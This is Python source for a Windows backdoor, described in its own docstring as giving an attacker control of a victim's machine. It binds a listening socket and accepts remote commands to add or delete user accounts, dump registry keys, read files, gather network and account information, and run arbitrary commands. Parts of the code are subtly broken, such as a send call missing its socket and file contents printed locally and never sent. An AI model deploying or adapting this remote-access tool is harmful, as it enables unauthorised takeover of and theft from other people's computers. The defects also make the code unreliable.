#!/usr/bin/env python
__author__ = "Suraj S Kattige"
__version__ = "1.0.0"
__email__ = "suraj.kattige056@gmail.com"
__maintainer__ = "Suraj S Kattige"
'''
Description: This is the server program that creates a backdoor in a victims machine and gives an attacker to execute the following commands:
1) Create User
2) Delete User
3) Download Registry Key
4) Download File
5) Gather Information
6) Execute a custom command
'''

import subprocess, re, socket, time, struct
from turtledemo.chaos import f
from winreg import *

def recv_data(sock):
    data_len, = struct.unpack('!I',sock.recv(4))
    return sock.recv(data_len)

def send_data(sock, data):
    data_len = len(data)
    sock.send(struct.pack('!I', data_len))
    sock.send(data)
    return

def get_data(sock, str_to_send):
    send_data(sock, str_to_send)
    return recv_data(sock)

def create_user(name, pwd, error_file):
    #net user /add name pwd
    cmd_list = ['net',
                'user',
                '/add',
                name,
                pwd]
    #Popen(args, bufsize = 0, executable = None, stdin = None, stdout, stderr)
    #Popen is used to open a pipe between us and the client user
    #Args is actually of type list that will concanetate all the valuesin the list. Hence we are passing cmd_list
    #As we need an output log file, we are passing 'log_file' as our stdout file handle
    subprocess.Popen(cmd_list, 0, None, None, None, error_file)
    error_file.close()
    f = open('log.txt', 'r')
    data = f.read()
    f.close()
    return data

def delete_user(name, error_file):
    #net user /del name
    cmd_list = ['net',
                'user',
                '/del',
                name]

    subprocess.Popen(cmd_list, 0, None, None, None, error_file)
    error_file.close()
    f = open('log.txt', 'r')
    data = f.read()
    f.close()
    return data

def download_registry_key(root, path, sock):
    key_hdl = CreateKey(root,path) #Create or opens the specified key
    num_subkeys, num_values,l_modified = QueryInfoKey(key_hdl) #Query the info in the key
    send_data(sock, ('SUBKEYS: %d\nValues: %d' %(num_subkeys,num_values)).encode('UTF-8')) #Return the keys and subkeys
    send_data(sock, ('=====================Subkeys=================================').encode('UTF-8'))
    for i in range(num_subkeys):
        send_data((EnumKey(key_hdl, i)).encode('UTF-8'))

    send_data(sock, ('\n\n').encode('UTF-8'))
    send_data(sock, ('=====================Values=================================').encode('UTF-8'))
    for i in range(num_values):
        v_name, v_data, d_type = EnumValue(key_hdl,i) #Enumerates the values of an open registry key
        send_data(sock, ('%s\t%s\t%s'%(v_name, v_data, d_type)).encode('UTF-8'))

    return

def download_file(file_name, sock):
    f = open(file_name, 'r')
    print(f.read())
    f.close()
    return

def gather_information(log_name, sock):
    cmd_list = [["ipconfig","/all"],
                ["net", "share"],
                ["net", "view"],
                ["net","file"],
                ["net", "localgroup"],
                ["net", "accounts"],
                ["net", "user"]]
    f = open(log_name, "w+")
    for i in range(len(cmd_list)):
        title = ''
        for j in cmd_list[i]:
            title += j + ''

        subprocess.Popen(cmd_list[i], 0, None, None, f, f)
        f.write('\n\n')
    f.close()
    return

def execute_command(cmd, error_log):
    a = ''
    cmd_list = cmd.split()
    print(cmd_list)
    try:
        subprocess.Popen(cmd_list, 0, None, None, a, error_log)
    except WindowsError:
        cmd_list.append('.com')
        subprocess.Popen(cmd_list, 0, None, None, None, error_log)
    return a

def main():
    f = open('errorlog.txt', 'w')
    command_list = ['CU', 'DU', 'DRK', 'DF','GI','EC']
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    HOST = ''
    PORT = 50010
    sock.bind((HOST, PORT))
    sock.listen(1)
    conn, addr = sock.accept()
    print('Connection is accepted')
    while True:
        choice = recv_data(conn)
        choice = choice.decode('utf-8')
        print('Choice received is: ', choice)
        if choice == 'CU':
            username = get_data(conn, ('Username: ').encode('UTF-8'))
            if type(username) == bytes:
                username = username.decode('UTF-8')
            password = get_data(conn, ('Password: ').encode('UTF-8'))
            if type(password) == bytes:
                password = password.decode('UTF-8')
            create_user(username, password, f)
            send_data(conn, ('The process has been successfully completed').encode('UTF-8'))
        elif choice == 'DU':
            username = get_data(conn, ('Username: ').encode('UTF-8'))
            if type(username) == bytes:
                username = username.decode('UTF-8')
            delete_user(username, f)
            send_data(conn, ('The process has been successfully completed').encode('UTF-8'))
        elif choice == 'DRK':
            root = get_data(conn, ('Root Key: ').encode('UTF-8'))
            root = root.decode('UTF-8')
            path = get_data(conn, ('Path in the Root Key: ').encode('UTF-8'))
            path = path.decode('UTF-8')
            download_registry_key(root, path, conn)
        elif choice == 'DF':
            filename = get_data(conn, ('Filename: ').encode('UTF-8'))
            download_file(filename, conn)
        elif choice == 'GI':
            gather_information('info.txt', conn)
        elif choice == 'EC':
            cmd = get_data(conn, 'Command: ')
            a = execute_command(cmd, 'errorlog.txt')
            send_data(conn, a)
        else:
            conn.close()
            break


    return

main()

